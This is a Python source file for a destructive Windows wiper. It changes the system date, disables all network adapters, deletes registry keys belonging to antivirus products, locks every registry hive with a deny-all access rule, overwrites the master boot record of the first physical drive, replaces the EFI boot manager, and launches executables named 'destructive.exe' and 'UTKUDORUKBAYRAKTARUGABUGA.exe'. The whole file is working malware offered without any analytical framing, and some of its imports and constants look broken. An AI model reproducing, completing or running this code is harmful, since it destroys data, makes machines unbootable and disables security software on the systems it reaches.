import os
import subprocess
import psutil
import time
import winreg
import shutil
from datetime import datetime
from pywin32 import win32security, win32api, win32con
import win32file
import sys
import wmi

# Set script directory
script_dir = os.getcwd()

# Define log directories and files
log_directory = os.path.join(script_dir, "log")
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Separate log files for different purposes
console_log_file = os.path.join(log_directory, "console.log")

# Redirect stdout to console log
sys.stdout = open(console_log_file, "w", encoding="utf-8", errors="ignore")

# Redirect stderr to console log
sys.stderr = open(console_log_file, "w", encoding="utf-8", errors="ignore")

# List of antivirus-related keywords (without ".com" suffix)
antivirus_keywords = [
    "virustotal", "hybrid-analysis", "filescan", "360totalsecurity", "acronis", "adaware", "avast",
    "avira", "bitdefender", "clamav", "comodo", "drweb", "emsisoft", "eset", "f-secure", "fortinet", 
    "gdatasoftware", "hitmanpro", "ikarussecurity", "k7computing", "kaspersky", "malwarebytes", "mcafee",
    "norton", "pandasecurity", "sophos", "spyhunter", "superantispyware", "trendmicro", "vipre", "webroot",
    "zonealarm", "avg", "escanav", "totalav", "combofix", "adguard", "smadav", "drweb", "intego",
    "crowdstrike", "esetnod32"
]

# Function to find antivirus products using WMI
def find_antivirus():
    c = wmi.WMI(namespace="root\\SecurityCenter2")  # Namespace for security products in WMI
    products = c.query("SELECT * FROM AntivirusProduct")
    
    found_antivirus = []
    
    for product in products:
        display_name = product.displayName
        # Check if the product name matches any antivirus keyword
        if any(keyword.lower() in display_name.lower() for keyword in antivirus_keywords):
            found_antivirus.append(display_name)
    
    return found_antivirus

# Function to recursively search and delete antivirus-related registry keys
def remove_antivirus_registry():
    try:
        # Search for antivirus software using WMI
        found_antivirus = find_antivirus()
        
        if not found_antivirus:
            print("No antivirus software found.")
            return

        # Search for registry entries related to antivirus software
        hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
        
        for hive in hives:
            for root_path in ["SOFTWARE", "SOFTWARE\\WOW6432Node"]:
                try:
                    key = winreg.OpenKey(hive, root_path, 0, winreg.KEY_READ | winreg.KEY_WRITE)
                    num_subkeys = winreg.QueryInfoKey(key)[0]
                    for i in range(num_subkeys):
                        subkey_name = winreg.EnumKey(key, i)
                        # If the subkey matches any antivirus keyword, delete it
                        if any(keyword.lower() in subkey_name.lower() for keyword in antivirus_keywords):
                            print(f"Found registry entry: {subkey_name}")
                            try:
                                subkey = winreg.OpenKey(hive, f"{root_path}\\{subkey_name}", 0, winreg.KEY_WRITE)
                                winreg.DeleteKey(subkey, '')
                                print(f"Deleted registry entry: {subkey_name}")
                            except Exception as e:
                                print(f"Error deleting subkey {subkey_name}: {e}")
                except FileNotFoundError:
                    continue
                except Exception as e:
                    print(f"Error accessing registry path {root_path}: {e}")
        print("Registry clean-up completed.")
    except Exception as e:
        print(f"An error occurred during registry clean-up: {e}")

# Function to change system date
def change_system_date():
    try:
        date_str = "01-19-2038"
        subprocess.run(["cmd.exe", "/C", f"date {date_str}"], check=True, shell=True)
        print("System date changed to 19-01-2038.")
    except Exception as e:
        print(f"An error occurred while changing the system date: {e}")


# Function to get network adapters and disable them
def get_network_adapters():
    try:
        adapters = psutil.net_if_addrs()
        interface_names = list(adapters.keys())
        print("Network adapters found:")
        for adapter in interface_names:
            print(adapter)
        return interface_names
    except Exception as e:
        print(f"An error occurred while getting network adapters: {e}")
        return []


def cut_network_connections(adapters):
    try:
        for adapter in adapters:
            subprocess.run(["netsh", "interface", "set", f"interface \"{adapter}\"", "admin=disable"], check=True)
            print(f"Network interface {adapter} disabled.")
    except Exception as e:
        print(f"An error occurred while cutting network connections: {e}")


def lock_registry_hives():
    try:
        hives = [
            ("HKEY_CLASSES_ROOT", winreg.HKEY_CLASSES_ROOT),
            ("HKEY_CURRENT_USER", winreg.HKEY_CURRENT_USER),
            ("HKEY_LOCAL_MACHINE", winreg.HKEY_LOCAL_MACHINE),
            ("HKEY_USERS", winreg.HKEY_USERS),
            ("HKEY_CURRENT_CONFIG", winreg.HKEY_CURRENT_CONFIG)
        ]

        for hive_name, hive in hives:
            lock_registry_hive(hive_name, hive)
    except Exception as e:
        print(f"An error occurred while locking all registry hives: {e}")


def lock_registry_hive(hive_name, hive):
    try:
        print(f"Locking registry hive: {hive_name}")
        key = winreg.OpenKey(hive, "", 0, winreg.KEY_WRITE)

        sd = win32security.GetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.OWNER_SECURITY_INFORMATION |
                                           win32con.DACL_SECURITY_INFORMATION)

        dacl = sd.GetSecurityDescriptorDacl()

        system_sid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "SYSTEM")[0])
        admins_sid = win32security.ConvertSidToStringSid(
            win32security.LookupAccountName(None, "BUILTIN\\Administrators")[0])

        dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, system_sid)
        dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, admins_sid)

        dacl.AddAccessDeniedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, None)

        win32security.SetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.DACL_SECURITY_INFORMATION, None, None,
                                      dacl, None)

        winreg.CloseKey(key)

        print(f"Registry hive {hive_name} locked successfully.")
    except Exception as e:
        print(f"An error occurred while locking registry hive {hive_name}: {e}")


def overwrite_mbr(bin_file_path):
    try:
        if not os.path.exists(bin_file_path):
            print(f"Error: {bin_file_path} not found!")
            return

        drive_path = r"\\.\PhysicalDrive0"
        drive = win32file.CreateFile(
            drive_path,
            win32file.GENERIC_WRITE,
            0,  # No sharing
            None,
            win32file.OPEN_EXISTING,
            0,
            None
        )

        with open(bin_file_path, 'rb') as bin_file:
            mbr_data = bin_file.read()

        win32file.WriteFile(drive, mbr_data)
        win32file.CloseHandle(drive)

        print(f"MBR successfully overwritten using {bin_file_path}")
    except Exception as e:
        print(f"An error occurred while overwriting MBR: {e}")


def copy_bootmgfw_efi():
    try:
        source_path = os.path.join(script_dir, "bootmgfw.efi")
        destination_path = r"X:\EFI\Microsoft\Boot\bootmgfw.efi"

        if not os.path.exists(source_path):
            print(f"Source file {source_path} not found!")
            return

        destination_dir = os.path.dirname(destination_path)
        if not os.path.exists(destination_dir):
            os.makedirs(destination_dir)

        shutil.copy2(source_path, destination_path)
        print(f"bootmgfw.efi copied successfully to {destination_path}")
    except Exception as e:
        print(f"An error occurred while copying bootmgfw.efi: {e}")


def run_destructive_exe():
    try:
        exe_path = os.path.join(script_dir, "destructive.exe")

        if not os.path.exists(exe_path):
            print(f"Error: {exe_path} not found!")
            return

        subprocess.run([exe_path], check=True)
        print("destructive.exe executed successfully.")
    except Exception as e:
        print(f"An error occurred while running destructive.exe: {e}")


def run_utkudorukbayraktarugabuga_exe():
    try:
        # Assuming the folder is named 'UTKUDORUKBAYRAKTARUGABUGA'
        folder_path = os.path.join(os.getcwd(), "UTKUDORUKBAYRAKTARUGABUGA")
        exe_path = os.path.join(folder_path, "UTKUDORUKBAYRAKTARUGABUGA.exe")

        if not os.path.exists(exe_path):
            print(f"Error: {exe_path} not found!")
            return

        subprocess.run([exe_path], check=True)
        print("UTKUDORUKBAYRAKTARUGABUGA.exe executed successfully.")
    except Exception as e:
        print(f"An error occurred while running UTKUDORUKBAYRAKTARUGABUGA.exe: {e}")


def main():
    try:
        print("Changing system date to 19-01-2038...")
        change_system_date()

        print("Getting network interfaces and cutting connections...")
        adapters = get_network_adapters()
        cut_network_connections(adapters)
 
        # Call the function to find antivirus software and delete its registry entries
        remove_antivirus_registry()

        print("Locking all registry hives...")
        lock_registry_hives()

        print("Overwriting MBR...")
        overwrite_mbr(os.path.join(os.getcwd(), "AnNih.bin"))

        print("Copying bootmgfw.efi...")
        copy_bootmgfw_efi()
        
        time.sleep(30)

        print("Running destructive.exe...")
        run_destructive_exe()

        print("Running UTKUDORUKBAYRAKTARUGABUGA.exe...")
        run_utkudorukbayraktarugabuga_exe()

        print("All tasks completed successfully.")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
